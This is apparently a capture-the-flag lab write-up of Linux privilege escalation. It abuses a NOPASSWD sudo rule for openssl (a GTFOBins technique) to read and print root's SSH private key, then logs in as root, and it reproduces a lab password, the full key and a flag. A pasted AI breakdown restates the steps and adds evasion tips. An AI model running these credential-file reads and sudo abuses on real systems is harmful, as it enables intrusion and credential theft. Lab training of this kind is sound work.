Now that we have credentials (srvadm:ILFreightnixadm!), we can leverage the SSH port we saw open earlier and connect in for a stable connection

1. ssh srvadm@10.129.229.147 -> ILFreightnixadm! 
2. /bin/bash -i once in 
3. sudo -l
Matching Defaults entries for srvadm on dmz01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User srvadm may run the following commands on dmz01:
    (ALL) NOPASSWD: /usr/bin/openssl

4. https://gtfobins.github.io/gtfobins/openssl/ 
5. Let's try this to see if we can grab the SSH private key for the root user. 
This is ideal over just attempting to read the /etc/shadow file or obtain a reverse shell as the ida_rsa private key file will grant us SSH back into the environment as the root user, which is perfect for setting up our pivots.
6. GTFObins states -> LFILE=file_to_read
openssl enc -in "$LFILE"

7. srvadm@dmz01:~$ LFILE=/root/.ssh/id_rsa
srvadm@dmz01:~$ sudo /usr/bin/openssl enc -in $LFILE


-----BEGIN OPENSSH PRIVATE KEY-----
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
WNfJbbEPrmQf0AAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----

8. put into file on HOST machine 
9. chmod 600 rootkey 
10. ssh -i rootkey root@10.129.229.147 
11. root@dmz01:~# cat flag.txt
a34985b5976072c3c148abc751671302


GPT Break Down: 

üîê Post-Exploitation: Persistence and SSH Access via OpenSSL File Read
üß† Goal
Gain persistent root access via the SSH service by abusing srvadm's sudo permissions and extracting the root user's SSH private key from the filesystem using OpenSSL.

üéØ Exploit Path Summary
Initial shell from previous socat payload (Command Injection)

Escalated to srvadm using credentials found in TTY logs

Used sudo /usr/bin/openssl to read arbitrary files, including /root/.ssh/id_rsa

Extracted and reused the root key for stable SSH access

üß™ Steps Taken
Confirm SSH Access from Earlier Recon

Target: 10.129.229.147 (added to /etc/hosts)

Port 22 was open from original Nmap enumeration

SSH into Target as srvadm

bash
Copy
Edit
ssh srvadm@10.129.229.147
# Password: ILFreightnixadm!
Stabilize the Shell

bash
Copy
Edit
/bin/bash -i
Check sudo -l Permissions

bash
Copy
Edit
sudo -l
‚úÖ Output:

bash
Copy
Edit
(ALL) NOPASSWD: /usr/bin/openssl
Refer to GTFOBins Technique

https://gtfobins.github.io/gtfobins/openssl/

Method:

bash
Copy
Edit
LFILE=/root/.ssh/id_rsa
sudo openssl enc -in $LFILE
Dump the Private SSH Key

bash
Copy
Edit
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in $LFILE
‚úÖ Output: Full SSH Private Key

Transfer Key to Attacker Machine

Save contents as rootkey

bash
Copy
Edit
chmod 600 rootkey
SSH as Root

bash
Copy
Edit
ssh -i rootkey root@10.129.229.147
Confirm Root Access and Capture Flag

bash
Copy
Edit
root@dmz01:~# cat /root/flag.txt
a34985b5976072c3c148abc751671302
üß† Detection Tips
Indicator	Technique
sudo -l reveals OpenSSL	Check sudoers for file-read abuse
Target using OpenSSH keys	Always check /root/.ssh/id_rsa as LFILE
SSH available externally	Use for stable pivot & persistence
openssl enc -in <file> used in logs	Look for command history or abuse trails
üîÑ Obfuscation Optional
If filtering is added in future setups, consider:

bash
Copy
Edit
LFILE=/root/.ssh/id_rsa
sudo /usr/bin/openssl enc -in ${LFILE}
Or use wildcarding or IFS tricks depending on bash constraints.

